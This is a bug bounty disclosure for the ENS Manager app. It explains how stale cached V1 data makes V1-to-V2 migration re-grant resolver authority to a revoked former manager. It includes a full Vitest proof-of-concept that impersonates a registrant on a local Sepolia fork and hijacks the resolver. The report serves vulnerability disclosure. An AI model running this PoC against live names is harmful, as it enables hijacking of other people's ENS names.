# 93019 w a medium ens manager regrants a revoked v1 manager during migration enabling resolver hijack

**Submitted on Sep 13th 2026 at 21:38:34 UTC by @Paludo0x for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93019
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Summary

A user can follow the prudent sequence **revoke a former V1 manager, then migrate the name** and have ENS Manager reinstall that revoked authority in V2 without identifying the role recipient.

Manager obtains the V1 Registry owner from an indexed V1-name response, caches that response for five minutes, and converts a Registry owner different from the BaseRegistrar registrant into `managerAddress`. Before submission, Manager checks multiple live contract conditions but never binds `managerAddress` to the current V1 Registry owner. It then creates a single ordered batch that:

1. migrates the name to V2;
2. grants the cached address `ROLE_SET_RESOLVER`; and
3. records a verification expectation requiring that same cached address to hold the role.

If the former manager was revoked after the response was loaded, migration still succeeds because the migration contract authorizes the current BaseRegistrar owner, not the V1 Registry manager. ENS Manager then treats restoration of the revoked address as a successful outcome. The former manager can passively wait for migration and call `setResolver()` once to hijack or brick resolution for the victim's name.

## Vulnerability Details

### 1. Manager caches authorization-relevant V1 data

[`useV1Names.ts:12-23`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/hooks/useV1Names.ts#L12-L23) gives the V1-name response a five-minute freshness window:

```typescript
resultQueryOptions({
  queryKey: qk('migration', 'v1_names', {
    address: address?.toLowerCase(),
  }),
  queryFn:
    enabled && address ? () => getV1NamesForAddress(address) : skipToken,
  staleTime: 5 * 60 * 1000,
})
```

That response contains the V1 Registry owner separately from the BaseRegistrar registrant. There are two independent stale-data windows:

1. A normal page load preserves the former manager value as fresh for five minutes while the registrant revokes that manager before continuing migration.
2. [`v1SubgraphClient.ts:7-12`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/v1SubgraphClient.ts#L7-L12) obtains this authorization-relevant value from `https://v1-graphql.ens.dev/subgraph`, not from the V1 Registry. Indexing lag can therefore return a pre-revocation owner even after a new page load, independently of the client cache.

The PoC deterministically supplies the pre-revocation snapshot and proves its downstream effect. The five-minute cache source establishes the first production window. Subgraph lag is an additional reachability path; this report does not claim a measured lag duration.

### 2. Manager classifies the supplied snapshot without a live V1 Registry read

The in-scope Manager service re-exports `classifyName()` and passes the supplied `domains` directly into it at [`computeMigrationPreflight.ts:192-207`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/computeMigrationPreflight.ts#L192-L207). Although the function receives a `publicClient`, the subsequent live checks cover approvals, resolver readiness, contract code, migration routes, and HCA readiness; there is no V1 Registry `owner(namehash(name))` read before manager restoration is selected.

For context only, the imported classifier's data derivation is visible at [`packages/migration/src/service/classifyNames.ts:162-167`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/migration/src/service/classifyNames.ts#L162-L167):

```typescript
const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

`packages/migration` is not claimed as the attacked asset or an independent contract root. The in-scope flaw is Manager's use of this snapshot value as authorization input without validating it against current V1 state.

### 3. Submission rebuilds from the same stale classified object

[`migrationService.ts:886-963`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L886-L963) rebuilds each final atomic batch from `remaining`, the already-classified collection. Its fresh reads re-resolve migration routes and resolver readiness, but not the V1 manager.

[`migrationService.ts:1161-1204`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L1161-L1204) then deploys the HCA if required, submits migration approvals, and executes the final atomic batches. These wallet confirmations do not refresh or invalidate `managerAddress`.

### 4. The final batch migrates first and grants the cached address second

[`buildAtomicMigrationBatches.ts:608-625`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L625) creates both the grant and an expectation that the cached recipient receives it:

```typescript
if (classified.managerAddress) {
  innerExecutions.push({
    phase: 'manager-role-grant',
    name,
    names: [name],
    call: buildRoleGrantCall(classified),
  })
  verificationExpectations.push({
    id: expectationId(name, 'manager-role'),
    type: 'manager-role',
    name,
    label: classified.label,
    registry: V2_CONTRACTS.ETHRegistry,
    resource: labelToCanonicalId(classified.label),
    account: classified.managerAddress,
    roleBitmap: ROLE_SET_RESOLVER,
  })
}
```

[`buildRoleGrantCalls.ts:8-24`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L8-L24) encodes the security-relevant call directly:

```typescript
const ROLE_SET_RESOLVER = 1n << 24n

args: [resource, ROLE_SET_RESOLVER, name.managerAddress]
```

The batch assembler orders the `MigrationHelper.migrate()` execution before `manager-role-grant` at [`buildAtomicMigrationBatches.ts:742-780`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L742-L780). Thus the stale grant is created on the newly migrated V2 resource.

### 5. Manager positively verifies the unsafe state as success

This is not merely unchecked output. [`verifyAtomicMigrationBatch.ts:337-354`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts#L337-L354) consumes the expectation by calling `hasRoles(resource, roleBitmap, account)` using the stale account:

```typescript
case 'manager-role': {
  const registry = await resolveRegistryForName(/* ... */)
  return context.publicClient.readContract({
    address: registry,
    abi: permissionedRegistryReadAbi,
    functionName: 'hasRoles',
    args: [
      expectation.resource,
      expectation.roleBitmap,
      expectation.account,
    ],
    ...block,
  })
}
```

The application therefore regards the revoked former manager receiving V2 resolver authority as the intended canonical result.

The confirmation UI only says “Approve manager restoration” and “Restore the existing managers for your names” at [`WalletConfirmationStepsDialog.tsx:80-92`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx#L80-L92). It does not identify the recipient address whose role is about to be restored.

## Why Migration Still Succeeds After Revocation

The ENS contracts and subgraph are out of scope and are used here only to establish reachability of the in-scope Manager data flow.

Manager pins the HCA-aware `MigrationHelper` from `contracts-v2` PR #402 at `0xddC597d937618849348E18Db5D631Ce747bCDeEF` in [`manifest.ts:83-98`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/smart-account/src/providers/rhinestone/manifest.ts#L83-L98).

The exact helper source is pinned at contracts-v2 commit `5bbe6add1192c635215031e0b3f20d1e517959e5`. [`MigrationHelper.sol:96-123`](https://github.com/ensdomains/contracts-v2/blob/5bbe6add1192c635215031e0b3f20d1e517959e5/contracts/src/migration/MigrationHelper.sol#L96-L123) resolves the HCA caller to its owner, reads the current BaseRegistrar token owner, checks operator approval, and transfers the token. It never reads the V1 Registry manager.

[`UnlockedMigrationController.sol:85-120`](https://github.com/ensdomains/contracts-v2/blob/5bbe6add1192c635215031e0b3f20d1e517959e5/contracts/src/migration/UnlockedMigrationController.sol#L85-L120) reclaims and clears the V1 Registry record while injecting the V2 resource. Therefore, revoking the V1 manager does not prevent migration as long as the victim remains the BaseRegistrar registrant. The stale V2 role grant originates from Manager's transaction construction, not from a contract defect.

## Attack Scenario and Feasibility

1. The victim is the BaseRegistrar registrant of `victim.eth`; the attacker is an ordinary delegated V1 Registry manager for that name.
2. ENS Manager loads the migration page while the delegation exists. The supplied domain snapshot records the attacker as `domain.owner`, so Manager classifies the attacker as `managerAddress`.
3. Manager tells the victim to “Approve manager restoration” and “Restore the existing managers for your names,” but does not identify the recipient. That prompt gives the victim a direct reason to leave the flow and prudently reclaim V1 Registry ownership before proceeding. Manager's cached response still contains the old address. No attacker transaction is required during this interval.
4. The victim continues the normal Manager migration and approves the displayed migration steps. Manager does not re-read or display the current V1 manager as a security-sensitive grant recipient.
5. The atomic batch migrates the name to the victim and then grants the former manager `ROLE_SET_RESOLVER`.
6. Manager verifies that the former manager has the role and marks the batch successful.
7. The attacker passively observes migration completion and submits one ordinary `setResolver(resource, attackerControlledResolver)` transaction.
8. Resolution for the victim's name is now controlled or bricked by the attacker until the victim discovers and revokes the hidden V2 role.

The prerequisite is prior per-name V1 manager access that has ended before migration. The attack needs no leaked key, governance address, browser defect, malicious contract, phishing, or interaction with an external system. The victim retains ownership and can recover after discovery; the report does not claim permanent ownership loss or demonstrated theft of funds.

## Impact and Severity

The live competition scope defines the following Critical impact:

> Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker.

This finding reaches the category's principal outcome. The migration does not directly write the final attacker resolver; it grants the former manager the exact role that authorizes an immediate `setResolver()` call, and the PoC executes that call successfully. “Such as” makes the examples non-exhaustive, while the category's operative impact is hijacking or bricking during the Manager migration flow.

The secondary Critical category is also relevant because Manager builds and submits an unintended `grantRoles(..., formerManager)` transaction detail from stale data. The primary claim remains resolver hijacking, not monetary theft.

This is not a griefing-only outcome. The attacker receives and exercises usable resolver-control authority: the PoC changes the victim name's resolver to an attacker-selected address. The victim retaining token ownership affects recoverability, not whether the demonstrated name hijack occurs.

Live scope and impact table: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>

## Known-Issue and Duplicate Analysis

The live disclosure was rechecked on 13 September 2026. It contains no entry for stale V1 manager data, manager restoration, or failure to bind a migration-created V2 grant to the current V1 Registry owner.

* **QA-01 / WEB-1257:** follow-up actions can error after transfers with certain role combinations. They do not create a fresh V2 role for a revoked principal. The disclosure explicitly says an unexpected authority grant goes beyond known functional breakage.
* **WEB-1305:** transferring V2 roles to a V1 name hangs. Here, V1-to-V2 migration succeeds and creates the wrong role.
* **contracts-v2 issue #418:** existing EAC roles can survive an ERC-1155 ownership transfer. This report does not rely on V2 role persistence across transfer; the in-scope Manager app creates a new role after migration from stale V1 data.

The closest known items therefore differ in both root cause and demonstrated security consequence.

## Proof of Concept

## PoC Explanation

Attach `stale-v1-manager.single-file.poc.test.ts` and place it at:

```
apps/manager/src/features/migration/service/stale-v1-manager.single-file.poc.test.ts
```

The single Manager Vitest file imports production `classifyName()` and `buildAtomicMigrationBatches()`.

### What test 1 proves

1. A V1 response keeps the victim as registrant but contains the former manager in `domain.owner`.
2. Production classification preserves the former manager.
3. Production batch construction orders `migrate` before `manager-role-grant`.
4. Decoding the real outer `executeByOwner` calldata shows both calls.
5. Decoding the real grant shows recipient `attacker` and role `1 << 24`.
6. The batch's production verification expectation requires the same attacker account to hold that role.

### What test 2 proves on the pinned fork

The second test uses `zesty-gecko.eth`, a real unwrapped V1 registration at Sepolia block `11696208`. At that block:

* BaseRegistrar owner: `0x0454e152198A6f7e488DC582957aD0CD94FF6478`;
* live V1 Registry manager: the same victim address and different from the supplied snapshot address, reproducing exactly the post-revocation state required by the attack;
* V2 status: `RESERVED`.

The test impersonates the real registrant only inside Anvil, provides the approval used by the application, and executes the exact `MigrationHelper.migrate()` inner call produced by Manager against deployed helper `0xddC597d937618849348E18Db5D631Ce747bCDeEF`. For this migration step, the PoC sends that inner call directly from the impersonated registrant rather than deploying a StandaloneHCA and wrapping it in `executeByOwner`. In production the HCA calls the same helper, which resolves the HCA to its certified owner; the token owner and authorization identity are therefore the same registrant exercised by the fork test. It then:

1. verifies V2 ownership remains with the victim;
2. gives a deterministic local account representing the HCA caller the same temporary ETHRegistry approval requested by Manager;
3. executes the exact app-generated stale manager grant;
4. verifies the attacker has `ROLE_SET_RESOLVER`;
5. calls `setResolver()` as the attacker; and
6. verifies the resolver changed to the attacker address.

For the subsequent role grant, test 2 models the HCA at the ETHRegistry caller boundary; no StandaloneHCA bytecode is deployed. Test 1 separately decodes the production `executeByOwner` wrapper and proves both the migration call and stale grant's positions inside it. The actual migration helper and V1-to-V2 state transition are not modeled: they execute against the pinned deployed contracts.

All impersonation and writes occur only on the disposable local fork. No Sepolia transaction is broadcast.

## Step-by-Step Reproduction

### 1. Check out the assessed target

```bash
git clone https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
corepack enable
pnpm install --frozen-lockfile
```

### 2. Add the attached single file

Copy `stale-v1-manager.single-file.poc.test.ts` to:

```
apps/manager/src/features/migration/service/stale-v1-manager.single-file.poc.test.ts
```

### 3. Start the pinned disposable Sepolia fork

```bash
docker run -d --rm --name ens-stale-manager-poc-anvil \
  -p 127.0.0.1:18545:8545 --entrypoint anvil \
  ghcr.io/foundry-rs/foundry@sha256:8347b728d5d393dac1c018691b36f506d23b9dcd78341d40ea0fcb11c3a19cdd \
  --fork-url https://ethereum-sepolia-rpc.publicnode.com \
  --fork-block-number 11696208 --chain-id 11155111 \
  --port 8545 --host 0.0.0.0
```

### 4. Run the PoC with the developers' Manager test suite

```bash
pnpm --filter manager exec vitest run \
  src/features/migration/service/stale-v1-manager.single-file.poc.test.ts \
  --reporter=verbose
```

### 5. Expected and observed security-relevant output

```json
{
  "snapshotManager": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
  "liveV1Manager": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
  "encodedRoleRecipient": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
  "encodedRoleBitmap": "16777216",
  "verifiedRoleRecipient": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
  "phaseOrder": ["migrate", "manager-role-grant"]
}
{
  "forkName": "zesty-gecko.eth",
  "baseOwnerBefore": "0x0454e152198A6f7e488DC582957aD0CD94FF6478",
  "liveV1ManagerBefore": "0x0454e152198A6f7e488DC582957aD0CD94FF6478",
  "staleSnapshotManager": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
  "migrationTarget": "0xddC597d937618849348E18Db5D631Ce747bCDeEF",
  "v2OwnerAfterMigration": "0x0454e152198A6f7e488DC582957aD0CD94FF6478",
  "attackerRoles": "16777216",
  "requiredRole": "16777216",
  "resolverAfter": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
}

Test Files  1 passed (1)
Tests       2 passed (2)
```

The isolated run completed successfully in 8.76 seconds.

The complete Manager suite also passed with the PoC present:

```
Test Files  175 passed (175)
Tests       1535 passed | 1 skipped (1536)
Duration    25.34s
```

### 6. Cleanup

```bash
docker stop ens-stale-manager-poc-anvil
```

```
/**
 * Single-file PoC for stale V1 manager restoration during ENS V1 -> V2
 * migration.
 *
 * Place at:
 *   apps/manager/src/features/migration/service/stale-v1-manager.single-file.poc.test.ts
 *
 * Start the pinned disposable Sepolia fork:
 *   docker run -d --rm --name ens-stale-manager-poc-anvil \
 *     -p 127.0.0.1:18545:8545 --entrypoint anvil \
 *     ghcr.io/foundry-rs/foundry@sha256:8347b728d5d393dac1c018691b36f506d23b9dcd78341d40ea0fcb11c3a19cdd \
 *     --fork-url https://ethereum-sepolia-rpc.publicnode.com \
 *     --fork-block-number 11696208 --chain-id 11155111 \
 *     --port 8545 --host 0.0.0.0
 *
 * Run:
 *   pnpm --filter manager exec vitest run \
 *     src/features/migration/service/stale-v1-manager.single-file.poc.test.ts \
 *     --reporter=verbose
 *
 * Cleanup:
 *   docker stop ens-stale-manager-poc-anvil
 */

import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeFunctionData,
  encodeFunctionData,
  http,
  parseAbi,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { labelhash as ensLabelhash, namehash } from 'viem/ens'
import { assert, describe, expect, it } from 'vitest'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import {
  permissionedRegistryGetResolverSnippet,
  permissionedRegistrySetResolverSnippet,
} from '@ensdomains/ensjs-abi/v2/permissionedRegistry'

import { ETH_REGISTRY_V2_ABI } from '@/features/migration/contracts/abis'
import {
  V1_CONTRACTS,
  V2_CONTRACTS,
} from '@/features/migration/contracts/addresses'
import { buildAtomicMigrationBatches } from '@/features/migration/service/buildAtomicMigrationBatches'
import { classifyName } from '@/features/migration/service/classifyNames'
import type { V1Domain } from '@/features/migration/service/v1SubgraphClient'

const RPC_URL = 'http://127.0.0.1:18545'
const ROLE_SET_RESOLVER = 1n << 24n

const victim = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const hca = privateKeyToAccount(
  '0x0000000000000000000000000000000000000000000000000000000000000003',
)

const baseRegistrarAbi = parseAbi([
  'function approve(address operator,uint256 tokenId)',
  'function ownerOf(uint256 tokenId) view returns (address)',
])
const v1RegistryAbi = parseAbi([
  'function owner(bytes32 node) view returns (address)',
])
const registryRolesAbi = parseAbi([
  'function roles(uint256 resource,address account) view returns (uint256)',
  'function getResource(uint256 anyId) view returns (uint256)',
  'function getOwner(uint256 anyId) view returns (address)',
  'function getStatus(uint256 anyId) view returns (uint8)',
])
const hcaOwnerExecutionAbi = parseAbi([
  'function executeByOwner((address target,uint256 value,bytes callData)[] executions) payable',
])

const label = 'stale-manager-poc-11696208'
const name = `${label}.eth`
const resource = labelToCanonicalId(label)

// A real, unwrapped V1 registration at the pinned Sepolia fork block. At that
// block its Registry owner equals its BaseRegistrar owner and its V2 status is
// RESERVED, so MigrationHelper.migrate() can execute its production path.
const forkLabel = 'zesty-gecko'
const forkName = `${forkLabel}.eth`
const forkTokenId = BigInt(ensLabelhash(forkLabel))
const forkResource = labelToCanonicalId(forkLabel)
const forkVictim = '0x0454e152198A6f7e488DC582957aD0CD94FF6478' as Address

const staleDomain = (): V1Domain => ({
  id: '0x8af47fd318706754f62fb5e00c34e742cc492df1269d94b0b1acbe55e1e67ad0',
  labelName: label,
  labelhash: `0x${resource.toString(16).padStart(64, '0')}`,
  name,
  resolver: null,
  // Snapshot: the attacker was the V1 registry manager.
  owner: { id: attacker.address },
  // The victim remains the BaseRegistrar token holder.
  registrant: { id: victim.address },
  wrappedOwner: null,
  parent: { name: 'eth', wrappedDomain: null },
  registration: { expiryDate: '1999999999' },
  wrappedDomain: null,
})

describe('stale V1 manager restoration', () => {
  it('encodes the cached former manager into the atomic migration batch', async () => {
    const classifiedResult = classifyName(staleDomain(), victim.address)
    assert(classifiedResult?.type === 'classified')
    const classified = classifiedResult.name

    // Ground truth after the snapshot: the attacker has relinquished V1
    // management to the victim. The production batch builder has no live V1
    // owner input and therefore cannot bind this value to its grant.
    const liveV1Manager = victim.address
    expect(classified.managerAddress).toBe(attacker.address)
    expect(classified.managerAddress).not.toBe(liveV1Manager)

    const plan = await buildAtomicMigrationBatches({
      chainId: sepolia.id,
      hca: hca.address,
      wallet: victim.address,
      classified: [classified],
      directRoutes: new Map([
        [
          name,
          {
            name,
            receiver: V2_CONTRACTS.UnlockedMigrationController,
            parentDependency: null,
            expectedWrapperRegistry: null,
            receiverReadiness: 'migration-controller' as const,
          },
        ],
      ]),
      profiles: new Map(),
      defaultResolver: V2_CONTRACTS.DefaultResolver,
      resolverDeployed: true,
      walletCoAdminGranted: true,
      maxOuterGas: 1_000_000n,
      estimateOuterGas: () => 100_000n,
    })

    const batch = plan.batches[0]
    assert(batch)
    expect(batch.innerExecutions.map(({ phase }) => phase)).toEqual([
      'migrate',
      'manager-role-grant',
    ])

    const roleGrant = batch.innerExecutions[1]
    assert(roleGrant?.phase === 'manager-role-grant')
    const decodedGrant = decodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      data: roleGrant.call.data,
    })
    expect(decodedGrant.functionName).toBe('grantRoles')
    expect(decodedGrant.args).toEqual([
      resource,
      ROLE_SET_RESOLVER,
      attacker.address,
    ])

    const decodedOuter = decodeFunctionData({
      abi: hcaOwnerExecutionAbi,
      data: batch.outerCall.data,
    })
    const [outerExecutions] = decodedOuter.args
    expect(outerExecutions).toHaveLength(2)
    expect(outerExecutions[1]?.target.toLowerCase()).toBe(
      V2_CONTRACTS.ETHRegistry.toLowerCase(),
    )

    const managerExpectation = batch.verificationExpectations.find(
      ({ type }) => type === 'manager-role',
    )
    assert(managerExpectation?.type === 'manager-role')
    expect(managerExpectation.account).toBe(attacker.address)
    expect(managerExpectation.resource).toBe(resource)
    expect(managerExpectation.roleBitmap).toBe(ROLE_SET_RESOLVER)

    console.log(
      JSON.stringify(
        {
          snapshotManager: classified.managerAddress,
          liveV1Manager,
          encodedRoleRecipient: decodedGrant.args[2],
          encodedRoleBitmap: decodedGrant.args[1].toString(),
          verifiedRoleRecipient: managerExpectation.account,
          phaseOrder: batch.innerExecutions.map(({ phase }) => phase),
        },
        null,
        2,
      ),
    )
  })

  it('migrates a real V1 name, regrants its stale manager, and replaces its resolver', async () => {
    const transport = http(RPC_URL)
    const publicClient = createPublicClient({ chain: sepolia, transport })
    const testClient = createTestClient({
      chain: sepolia,
      mode: 'anvil',
      transport,
    })
    const forkVictimWallet = createWalletClient({ chain: sepolia, transport })
    const attackerWallet = createWalletClient({
      account: attacker,
      chain: sepolia,
      transport,
    })
    const hcaWallet = createWalletClient({
      account: hca,
      chain: sepolia,
      transport,
    })

    expect(await publicClient.getChainId()).toBe(sepolia.id)
    expect(
      await publicClient.getBytecode({ address: V2_CONTRACTS.ETHRegistry }),
    ).not.toBeUndefined()
    // These are deterministic Anvil accounts. Wiping any inherited Sepolia
    // bytecode affects only this disposable fork and makes them ordinary EOAs.
    await testClient.setCode({ address: attacker.address, bytecode: '0x' })
    await testClient.setCode({ address: hca.address, bytecode: '0x' })
    await testClient.setBalance({
      address: forkVictim,
      value: 10n ** 20n,
    })
    await testClient.setBalance({
      address: attacker.address,
      value: 10n ** 20n,
    })
    await testClient.setBalance({
      address: hca.address,
      value: 10n ** 20n,
    })
    const baseOwnerBefore = await publicClient.readContract({
      address: V1_CONTRACTS.BaseRegistrar,
      abi: baseRegistrarAbi,
      functionName: 'ownerOf',
      args: [forkTokenId],
    })
    const liveV1ManagerBefore = await publicClient.readContract({
      address: '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e',
      abi: v1RegistryAbi,
      functionName: 'owner',
      args: [namehash(forkName)],
    })
    const statusBefore = await publicClient.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: registryRolesAbi,
      functionName: 'getStatus',
      args: [forkTokenId],
    })
    expect(baseOwnerBefore).toBe(forkVictim)
    expect(liveV1ManagerBefore).toBe(forkVictim)
    expect(statusBefore).toBe(1)

    const forkDomain: V1Domain = {
      id: namehash(forkName),
      labelName: forkLabel,
      labelhash: ensLabelhash(forkLabel),
      name: forkName,
      resolver: null,
      // Deliberately stale application snapshot: this address used to manage
      // the name, while the pinned live fork state above shows it was revoked.
      owner: { id: attacker.address },
      registrant: { id: forkVictim },
      wrappedOwner: null,
      parent: { name: 'eth', wrappedDomain: null },
      registration: { expiryDate: '1810095972' },
      wrappedDomain: null,
    }
    const classifiedResult = classifyName(forkDomain, forkVictim)
    assert(classifiedResult?.type === 'classified')
    const appPlan = await buildAtomicMigrationBatches({
      chainId: sepolia.id,
      hca: hca.address,
      wallet: forkVictim,
      classified: [classifiedResult.name],
      directRoutes: new Map([
        [
          forkName,
          {
            name: forkName,
            receiver: V2_CONTRACTS.UnlockedMigrationController,
            parentDependency: null,
            expectedWrapperRegistry: null,
            receiverReadiness: 'migration-controller' as const,
          },
        ],
      ]),
      profiles: new Map(),
      defaultResolver: V2_CONTRACTS.DefaultResolver,
      resolverDeployed: true,
      walletCoAdminGranted: true,
      maxOuterGas: 1_000_000n,
      estimateOuterGas: () => 100_000n,
    })
    const migrationCall = appPlan.batches[0]?.innerExecutions.find(
      ({ phase }) => phase === 'migrate',
    )
    const appRoleGrant = appPlan.batches[0]?.innerExecutions.find(
      ({ phase }) => phase === 'manager-role-grant',
    )
    assert(migrationCall)
    assert(appRoleGrant)

    // All writes below occur only after impersonating the real owner inside
    // the disposable local fork. The app-generated MigrationHelper call is
    // executed unchanged against the pinned deployed helper.
    await testClient.impersonateAccount({ address: forkVictim })
    try {
      const approveMigrationHash = await forkVictimWallet.sendTransaction({
        account: forkVictim,
        to: V1_CONTRACTS.BaseRegistrar,
        data: encodeFunctionData({
          abi: baseRegistrarAbi,
          functionName: 'approve',
          args: [V2_CONTRACTS.MigrationHelper, forkTokenId],
        }),
      })
      await publicClient.waitForTransactionReceipt({
        hash: approveMigrationHash,
      })

      const migrationHash = await forkVictimWallet.sendTransaction({
        account: forkVictim,
        ...migrationCall.call,
      })
      const migrationReceipt = await publicClient.waitForTransactionReceipt({
        hash: migrationHash,
      })
      expect(migrationReceipt.status).toBe('success')

      const approvalHash = await forkVictimWallet.sendTransaction({
        account: forkVictim,
        to: V2_CONTRACTS.ETHRegistry,
        data: encodeFunctionData({
          abi: ETH_REGISTRY_V2_ABI,
          functionName: 'setApprovalForAll',
          args: [hca.address, true],
        }),
      })
      await publicClient.waitForTransactionReceipt({ hash: approvalHash })
    } finally {
      await testClient.stopImpersonatingAccount({ address: forkVictim })
    }

    expect(
      await publicClient.readContract({
        address: V2_CONTRACTS.ETHRegistry,
        abi: registryRolesAbi,
        functionName: 'getOwner',
        args: [forkResource],
      }),
    ).toBe(forkVictim)

    // This is the same temporary V2 registry operator approval requested by
    // the Manager whenever manager restoration is required. A deterministic
    // local account represents the HCA caller at the ETHRegistry boundary;
    // the first test separately validates the real executeByOwner encoding.
    const grantHash = await hcaWallet.sendTransaction(appRoleGrant.call)
    await publicClient.waitForTransactionReceipt({ hash: grantHash })

    const attackerRoles = await publicClient.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: registryRolesAbi,
      functionName: 'roles',
      args: [forkResource, attacker.address],
    })
    expect(attackerRoles & ROLE_SET_RESOLVER).toBe(ROLE_SET_RESOLVER)

    const replaceHash = await attackerWallet.sendTransaction({
      to: V2_CONTRACTS.ETHRegistry,
      data: encodeFunctionData({
        abi: permissionedRegistrySetResolverSnippet,
        functionName: 'setResolver',
        args: [forkResource, attacker.address],
      }),
    })
    await publicClient.waitForTransactionReceipt({ hash: replaceHash })

    const resolverAfter = await publicClient.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: permissionedRegistryGetResolverSnippet,
      functionName: 'getResolver',
      args: [forkLabel],
    })
    expect(resolverAfter).toBe(attacker.address)

    console.log(
      JSON.stringify(
        {
          forkName,
          baseOwnerBefore,
          liveV1ManagerBefore,
          staleSnapshotManager: attacker.address,
          migrationTarget: migrationCall.call.to,
          v2OwnerAfterMigration: forkVictim,
          attackerRoles: attackerRoles.toString(),
          requiredRole: ROLE_SET_RESOLVER.toString(),
          resolverAfter,
        },
        null,
        2,
      ),
    )
  }, 30_000)
})

```
